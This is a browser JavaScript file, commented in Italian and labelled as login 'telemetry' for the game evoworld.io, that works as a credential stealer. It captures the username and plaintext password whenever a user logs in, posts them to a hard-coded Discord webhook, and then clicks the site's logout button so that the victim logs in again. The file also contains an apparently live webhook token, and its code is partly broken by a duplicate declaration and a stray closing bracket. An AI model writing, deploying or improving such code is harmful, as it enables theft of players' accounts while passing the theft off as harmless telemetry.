// =====================================
// EvoWorld - Login Telemetry + Logout automatico (WORKING)
// =====================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; 

let lastTextInput = null;
let lastPasswordInput = null;
let logoutDone = false; // flag per eseguire logout solo una volta

// ----------------------------
// Traccia input di testo e password
// ----------------------------
document.addEventListener("focusin", e => {
  if (e.target.tagName === "INPUT") {
    if (e.target.type === "text") {
      lastTextInput = e.target;
      console.log("[Telemetry] input username agganciato");
    } else if (e.target.type === "password") {
      lastPasswordInput = e.target;
      console.log("[Telemetry] input password agganciato");
    }
  }
});

// ----------------------------
// Funzione di invio telemetry
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value.trim() || "";
  const password = lastPasswordInput?.value || "";

  const payload = {
    event: "login_submit",
    username: username,
    username_length: username.length,
    password: password,
    method,
    timestamp: new Date().toISOString()
  };

  // ----- Console-only (per debug) -----
  console.log("[Telemetry] INVIO SIMULATO");
  console.log(payload);

  // ----- Invio reale su Discord -----
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    console.log("[Telemetry] Inviato su Discord");
  } catch (err) {
    console.error("[Telemetry] Errore invio Discord:", err);
  }
}

// ----------------------------
// ENTER (login via tastiera)
// ----------------------------
document.addEventListener("keydown", e => {
  if (e.key === "Enter") sendTelemetry("enter");
});

// ----------------------------
// CLICK SU QUALSIASI "Login"
// ----------------------------
document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") {
    sendTelemetry("click_login");
  }
});

// ----------------------------
// Auto Logout per evoworld.io
// ----------------------------

let logoutDone = false;

const interval = setInterval(() => {
  if (logoutDone) return;

  // Possibili selettori del logout
  const logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    logoutDone = true;
    clearInterval(interval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000); // controlla ogni secondo

// Sicurezza: stop dopo 15 secondi
setTimeout(() => {
  if (!logoutDone) {
    clearInterval(interval);
    console.log("[AutoLogout] Logout non trovato (timeout)");
  }
}, 15000);

});
